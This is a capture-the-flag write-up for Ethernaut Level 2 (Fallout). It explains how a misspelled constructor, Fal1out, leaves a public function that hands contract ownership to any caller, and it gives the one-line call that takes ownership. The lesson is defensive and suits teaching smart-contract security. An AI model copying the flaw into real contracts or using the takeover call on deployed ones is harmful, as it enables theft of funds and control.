<div align="center">

<img src="../assets/levels/2-fallout.webp" width="600px"/>
<br><br>
<h1><strong>Ethernaut Level 2 - Fallout</strong></h1>

</div>

## Table of Contents

- [Table of Contents](#table-of-contents)
- [Objectif](#objectif)
- [The hack](#the-hack)
- [Solution](#solution)
- [Takeaway](#takeaway)

## Objectif

<img src="../assets/requirements/2-fallout-requirements.webp" width="800px"/>

## The hack

Unlike a normal function that can be called anytime, a constructor is only executed once during the creation of the contract. In solidity version prior to `0.8.0`, a constructor was defined by naming it exactly the same as your contract's name.

```javascript
pragma solidity ^0.6.0;

contract Foo {
    // This is a constructor
    function Foo() public payable {}

    // This is a function
    function Bar() public payable {}
}
```

Unfortunatly here, the typo in the `Fal1out()` function makes it a normal function, instead of a constructor. Because of that, `Fal1out()` is a public function that anyone can call to take ownership of the contract.

```javascript
/* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

The `Fal1out` function should have been named as `Fallout`.

## Solution

1. Simply call the `Fal1out()` function to take ownership of the contract.

```javascript
await contract.Fal1out();
```

## Takeaway

- Review your code carefully and multiple times before deploying it
- Use tests to catch obvious bugs like this one.

<div align="center">
<br>
<h2>🎉 Level completed! 🎉</h2>
</div>
